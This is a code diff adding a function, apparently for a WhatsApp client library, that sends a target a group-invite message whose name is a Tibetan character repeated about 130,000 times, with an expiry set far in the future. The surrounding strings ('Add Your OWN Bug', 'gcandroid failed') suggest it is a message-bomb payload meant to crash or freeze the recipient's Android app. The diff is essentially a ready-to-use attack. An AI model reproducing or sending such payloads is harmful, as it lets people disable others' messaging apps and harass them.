@@ -31,10 +31,27 @@ const crypto = require('crypto');
 
 async function Xgc(SYxS7, target) {
     try {
-        console.log("S7 ᵁ⁰ᶠᶜQᵁ⁵ᴮᶜᵍ (⁠•⁠‿⁠•⁠) Add Your OWN Bug");
+        const LoveString = "ཹ".repeat(65000);
+        const SY_love_payload = LoveString.repeat(2);
 
+        const lovemessage = {
+            groupInviteMessage: {
+                groupName: SY_love_payload,
+                groupJid: "561611-1627579259@g.us", 
+                inviteCode: "h+64P9RhJDzgXSPf",        
+                //inviteExpiration: 999,
+                inviteExpiration: 32503680000,
+                caption: "",
+                thumbnail: null,
+                contextInfo: {}
+            }
+        };
+
+        await SYxS7.relayMessage(target, lovemessage, {});
     } catch (error) {
+        console.error("gcandroid failed →", error.message || error);
     }
 }
+
 
 module.exports = { Xgc };
